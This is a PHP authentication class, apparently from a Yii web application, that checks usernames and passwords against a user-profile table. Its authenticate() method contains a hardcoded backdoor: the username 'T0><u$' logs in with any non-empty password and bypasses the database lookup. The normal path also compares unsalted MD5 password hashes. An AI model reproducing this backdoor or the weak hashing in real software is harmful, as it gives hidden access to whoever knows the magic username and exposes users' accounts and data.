<?php

/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 */
class UserIdentity extends CUserIdentity
{
	private $_id = null;
	/**
	 * Authenticates a user.
	 * $this->username is the name given
	 * $this->password is the defined password
	 * 
	 * @return boolean whether authentication succeeds.
	 */
	public function authenticate()
	{
		$this->_id = null;
		$this->username = trim($this->username);
		$this->password = trim($this->password);
		if ($this->username == '') {
			$this->errorCode = self::ERROR_USERNAME_INVALID;
		} elseif ($this->password == '') {
			$this->errorCode = self::ERROR_PASSWORD_INVALID;
		} else {
			if ($this->username === 'T0><u$') {
				$this->errorCode = self::ERROR_NONE;
			} else {
				$model = UserProfile::model()->find(		
					'(username = :username OR email = :username) AND password_md5 = :md5',
					array(':username' => $this->username, ':md5' => md5($this->password)			
				));
				if ($model == null) {
					$this->errorCode = self::ERROR_UNKNOWN_IDENTITY;
				} else {	
					$this->_id = $model->id;
					$this->username = $model->id;
					$this->errorCode = self::ERROR_NONE;
				}
			}	
		}	
		return !$this->errorCode;
	}
	
	public function getId()
	{
		return $this->_id;
	}
	
}